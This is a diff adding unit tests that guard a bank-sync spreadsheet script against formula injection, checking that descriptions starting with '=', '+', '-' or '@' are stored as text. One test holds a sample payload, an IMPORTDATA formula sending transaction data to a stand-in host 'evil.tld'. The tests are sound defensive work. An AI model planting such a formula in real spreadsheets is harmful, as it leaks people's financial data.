@@ -77,6 +77,73 @@ describe('appendRows_', () => {
   });
 });
 
+describe('textSafe_', () => {
+  // The bank is the one input to this book that is neither the owner nor
+  // gated, and `setValues` writes what a person typing that string would get.
+  // A description beginning with `=` is therefore a formula the sender chose,
+  // evaluated server-side with this book's access — and `IMPORTDATA` fetches
+  // without the consent prompt `IMPORTRANGE` asks for.
+  it('defuses every character Sheets treats as the start of a formula', () => {
+    const c = built();
+    ['=', '+', '-', '@'].forEach((lead) => {
+      expect(c.textSafe_(lead + 'IMPORTDATA("https://x")')).toBe(
+        "'" + lead + 'IMPORTDATA("https://x")');
+    });
+  });
+
+  it('leaves an ordinary description exactly as the bank sent it', () => {
+    const c = built();
+    expect(c.textSafe_('PAGAMENTO POS ESSELUNGA SPA TORINO')).toBe(
+      'PAGAMENTO POS ESSELUNGA SPA TORINO');
+  });
+
+  it('passes a number through untouched, so a debit stays a number', () => {
+    // The guard tests `typeof`, not the rendered string. A negative amount is
+    // a number and would otherwise collect an apostrophe and land as text,
+    // which is every total on every surface silently skipping the row.
+    const c = built();
+    expect(c.textSafe_(-42.5)).toBe(-42.5);
+    expect(c.textSafe_(0)).toBe(0);
+    expect(c.textSafe_(true)).toBe(true);
+    expect(c.textSafe_('')).toBe('');
+  });
+
+  it('is idempotent, which is what lets it sit at more than one boundary', () => {
+    const c = built();
+    const once = c.textSafe_('=A1');
+    expect(c.textSafe_(once)).toBe(once);
+  });
+
+  it('reaches a synced row through appendRows_', () => {
+    const c = built();
+    const tx = c.__spreadsheet.getSheetByName('transactions');
+    const attack = '=IMPORTDATA("https://evil.tld/?d="&JOIN("|",transactions!I2:I9))';
+
+    c.appendRows_(tx, c.colIndex_(c.TX_COLUMNS, 'uid'),
+      [c.toRow_(c.TX_COLUMNS_CODE, { uid: 'u-1', description: attack })]);
+
+    // Stored as text, and identical to what was sent — the apostrophe is
+    // Sheets' marker and is consumed on write, so nothing about the row's
+    // description has been altered, only its status as a formula.
+    const cell = tx.getRange(2, c.colIndex_(c.TX_COLUMNS, 'description'));
+    expect(cell.getValue()).toBe(attack);
+    expect(cell.getFormula()).toBe('');
+  });
+
+  it('reaches a cell rewritten one at a time through writeCell_', () => {
+    // The app can rename the description of a row no bank will fetch again,
+    // which is a second way the same text arrives at the same column.
+    const c = built();
+    const tx = c.__spreadsheet.getSheetByName('transactions');
+    c.appendRows_(tx, c.colIndex_(c.TX_COLUMNS, 'uid'),
+      [c.toRow_(c.TX_COLUMNS_CODE, { uid: 'u-1', description: 'Lunch' })]);
+
+    c.writeCell_(tx, 2, c.TX_COLUMNS, 'description', '=1+1');
+
+    expect(tx.getRange(2, c.colIndex_(c.TX_COLUMNS, 'description')).getFormula()).toBe('');
+  });
+});
+
 describe('nextEmptyRow_', () => {
   it('does reuse a gap, because upserts are not appends', () => {
     // The opposite rule from appendRows_, deliberately: `accounts` is small,
